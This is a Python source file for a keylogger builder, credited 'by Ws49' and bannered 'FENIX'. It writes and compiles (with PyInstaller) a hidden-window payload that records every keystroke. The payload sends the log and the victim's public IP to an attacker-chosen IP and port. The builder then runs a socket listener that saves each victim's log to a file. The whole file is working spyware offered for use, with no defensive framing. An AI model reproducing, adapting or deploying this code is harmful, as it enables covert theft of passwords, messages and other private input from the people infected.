from multiprocessing import connection
import socket
from http import client
import os

os.system('pip install pyinstaller')
os.system('pip install pynput')
os.system('pip install pywin32')
os.system('pip install requests')

def generate_exeLogger(ip,port):
    payload = f"""
from pynput.keyboard import Listener
import os
import subprocess
import threading
import win32gui
import win32con
from http import client
import socket
from multiprocessing import connection
import requests


hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    return ip_info['ip']


def update_dados():
    while True:
        ip_public = get_public_ip()

        try:
            nexus = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            nexus.connect(('{ip}', {port}))

            namefile = "log.txt"

            with open(namefile,"rb") as file:
                for data in file.readlines():
                    nexus.send(data)
                    
            ip_public = ";" + ip_public
            nexus.send(ip_public.encode())
            nexus.send(b";END_OF_FILE")
            
        except Exception as e:
            print(e)        
        

thread_update = threading.Thread(target=update_dados)
thread_update.start()

def log(teclado):

    with open('log.txt','a') as arq_log:
        
        if str(teclado) != 'Key.space' and str(teclado) != 'Key.enter' :   
            arq_log.write(str(teclado))
        elif str(teclado) == 'Key.space':
            arq_log.write("  ")
        elif str(teclado) == 'Key.enter':
            arq_log.write("\\n")
        
       

with Listener(on_press=log) as monitor:
   monitor.join()    
    
    
    
    """
    with open("Key.py", 'w') as file:
        file.write(payload)
    file.close()
    
    os.system('pyinstaller Key.py --onefile')
    print("|Payload Create Sucess!")
    
os.system("cls")
os.system("color 2")           

print("███████╗                      ███████╗                      ███╗░░██╗                      ██╗                      ██╗░░██╗")
print("██╔════╝                      ██╔════╝                      ████╗░██║                      ██║                      ╚██╗██╔╝")
print("█████╗░░                      █████╗░░                      ██╔██╗██║                      ██║                      ░╚███╔╝░")
print("██╔══╝░░                      ██╔══╝░░                      ██║╚████║                      ██║                      ░██╔██╗░")
print("██║░░░░░                      ███████╗                      ██║░╚███║                      ██║                      ██╔╝╚██╗")
print("╚═╝░░░░░                      ╚══════╝                      ╚═╝░░╚══╝                      ╚═╝                      ╚═╝░░╚═╝")
                                                                                                   
print("              ##                                                                                        @@                                   ")       
print("            ##########                                                                              ########                                 ")     
print("              ############                                                                      ++########                                   ")   
print("      MM    mm++++::mm######                                                                  ######mm::++      ##                           ") 
print("      mm##@@######mm--..MM######                                                            ######..::mm##########                           ")
print("      ++######--####@@..  ########MM                                                    ########  ..++####--######                           ")
print("      ::######--  ::##....@@##::########                                          mm######MM####----@@..  ####@@                             ")
print("        ::MM####      --########  MM##++##                                      ########--  ######..--  ..####                               ")
print("    ##  ++::##::##      ..--######  ####::##                                  mm##..##..  ####@@      ++####                                 ")
print("    ####++####  --@@##      ..mm##    ##--##                                  ##  ####  --##--..    ##@@  ####  ####                         ")
print("      ##########      mm##      mm....####  ##                              mm##  ####  ##..    ####      ########                           ")
print("        ++######..    ......##    ######    ##                              @@--  ####  ::  --@@        ########                             ")
print("       --..--  @@####        ##::########@@  ##                              ##..##########--::..      ####mm                                ")
print("       ####@@..    --mm##..  ++@@MM####@@@@  ##                              ##::########++####  ::##@@      ##@@####                        ")
print("         ######        ..  ::##  ##mm##MM##  ##          ##::####            @@mm##########++MM++  --      ++######                          ")
print("             ######          --::@@##  ####..##        ##########            ##--@@@@####@@MM++        ..######                              ")
print("           ::############        --##@@####  ##            ##@@  ##        ####  ##mm####..        MM########                                ")
print("           ######    --::@@##MM--  MM######  ####          ##    ##      ####MM--######..mm--++##@@::..  --####                              ")
print("           mm##@@##    ..      ::    ######MM  MM##        mm  ..--##MM::      ########--                ######                              ")
print("           MMMM######mm--....--##  ..##mm##@@##      @@####  ..##  ##--  --mm##########    MM--..::--########                                ")
print("             ########::          @@++######@@mm##########::######++########@@########..####          ..@@####                                ")
print("               mm##########@@--        ######@@##mm####MM  @@  mm..######::########::    ::  --############                                  ")
print("               ######  ..++mm        mm..##########MMMM####----::mm####MM########::  ::--..          ..######                                ")
print("               ######..  ....::::##..    --######@@####mm##########  ############--    ++##....++      ######                                ")
print("                 ##############@@              ..####MM##..--####--  ######++        ..    ++##############                                  ")
print("                 ::##########        --      ++    --####  ::..##..  ##      ::      ##--      MM########                                    ")
print("                   ::::####--    ::++##    ##        ..  ##    mm....##..      ##++    @@++::    ####                                        ")
print("                   ##################--##--    --  --    ##::::::MM##..++--..      ####--################                                    ")
print("                     ##########            ::mm    ....  ##  ----##++  ##  ..++..            ##########                                      ")
print("                       ######      ..--++++##      ++..  ##      ##  ..##    ++##mm++----      ######                                        ")
print("                           ################  ..--##--    ##..    ##  mm##++mm  ..################                                            ")
print("                           ::::::++@@##@@  ..::++##..  ..##  --..mmmm    ##++--    ####                                                      ")
print("                             MM######..  ..--::##--mm  ####....  @@##  ::::##::--    ..######                                                ")
print("                             --::..    ..::::##mm++  ++@@##----::####++  mm++##++..                                                          ")
print("                                 ..    --mm##MMMM  ..##--::##MMmm++####....++####++                                                          ")
print("                                   --mm@@####..++::####..--::##mm  @@##..MM--MM######                                                        ")
print("                                       @@##  MM####::--##::##::##mm##..  ####++  ##                                                          ")
print("                                       mm--######    ##MM####@@########..  ######MM                                                          ")
print("                                           ..####@@####  ####--####@@  ########                                                              ")
print("                                           ----MM##@@    ++##  ####      ##@@::--                                                            ")
print("                                                   --    ####  ..##          ::                                                              ")
print("                                                         ##      ##                                                                          ")
print("                                                                 ::                                                           by Ws49        ")
                                                                                                                                            
                                                                                                                                          
print("\n\n\n██╗░░░░░ ██╗ ░██████╗ ████████╗ ███████╗ ███╗░░██╗ ██╗ ███╗░░██╗ ░██████╗░ ░░░ ░░░ ░░░")
print("██║░░░░░ ██║ ██╔════╝ ╚══██╔══╝ ██╔════╝ ████╗░██║ ██║ ████╗░██║ ██╔════╝░ ░░░ ░░░ ░░░")
print("██║░░░░░ ██║ ╚█████╗░ ░░░██║░░░ █████╗░░ ██╔██╗██║ ██║ ██╔██╗██║ ██║░░██╗░ ░░░ ░░░ ░░░")
print("██║░░░░░ ██║ ░╚═══██╗ ░░░██║░░░ ██╔══╝░░ ██║╚████║ ██║ ██║╚████║ ██║░░╚██╗ ░░░ ░░░ ░░░")
print("███████╗ ██║ ██████╔╝ ░░░██║░░░ ███████╗ ██║░╚███║ ██║ ██║░╚███║ ╚██████╔╝ ██╗ ██╗ ██╗")
print("╚══════╝ ╚═╝ ╚═════╝░ ░░░╚═╝░░░ ╚══════╝ ╚═╝░░╚══╝ ╚═╝ ╚═╝░░╚══╝ ░╚═════╝░ ╚═╝ ╚═╝ ╚═╝  ")                                                                                          
                                                                                                                                            
ip = input('IP: ')                                                                                                                                           
port = input('PORT: ') 
                                                                                                                                                                                                                                                                                                                                                 
generate_exeLogger(str(ip), int(port))

fenix = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
fenix.settimeout(None)
fenix.bind((str(ip), int(port)))
fenix.listen(1)                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
while True:
    connection, address = fenix.accept()
    received_bytes = b''
    
    while True:
        data = connection.recv(1024)
        if not data:
            break
        if data.endswith(b"END_OF_FILE"):
            received_bytes += data[:-len(b"END_OF_FILE")]
            break
        received_bytes += data
    try:
        decode_data = received_bytes.decode('utf-8')
    except UnicodeDecodeError:
        decode_data = received_bytes.decode('utf-8', errors='ignore')
        
        
    myconnection =  decode_data.split(";")[len(decode_data.split(";")) - 2]
    myconnection +=";;"
    received_bytes = received_bytes[:-len(myconnection.encode())]
    
    myconnection = myconnection.replace(";;","")
    
    namefile = "logs[" + str(myconnection) + "].txt"
    with open(namefile, 'wb') as file:
            file.write(received_bytes)

    print(f'[{namefile}] - >  received  ')
            
